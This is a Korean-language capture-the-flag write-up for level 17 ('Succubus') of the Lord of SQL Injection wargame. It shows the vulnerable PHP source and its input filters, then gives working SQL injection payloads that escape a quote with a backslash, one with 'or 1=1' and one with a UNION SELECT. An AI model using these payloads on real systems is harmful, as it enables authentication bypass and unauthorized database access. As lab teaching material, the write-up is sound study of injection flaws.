# Lord of SQL Injection No.17 - Succubus
## 문제 출제 의도
\ (backSlach)을 통해 single quote를 무효화 시킬 수 있는지 확인한다.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("succubus"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
    - GET방식으로 받은 id안에 prob, _, .,(,)이 하나라도 있으면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 받은 pw안에 prob, _, .,(,)이 하나라도 있으면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 받은 id안에 single quote가 있으면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - GET방식으로 받은 pw안에 single quote가 있으면 "HeHe"가 출력되고 문제 풀이에 실패한다.

## 문제 해결
1. Query문 추가
    - 다음과 유사한 방법으로 문제 해결이 가능하다.
    ~~~
    ?id=\&pw=or 1=1 -- -
    ~~~
    - '\'는 특수문자 앞에 붙으면 다음 특수문자를 일반 문자로 바꿔 준다.
2. UNION
    - 다음과 유사한 방법으로 문제 해결이 가능하다.
    ~~~
    ?id=\&pw=UNION(SELECT "admin")-- -
    ~~~
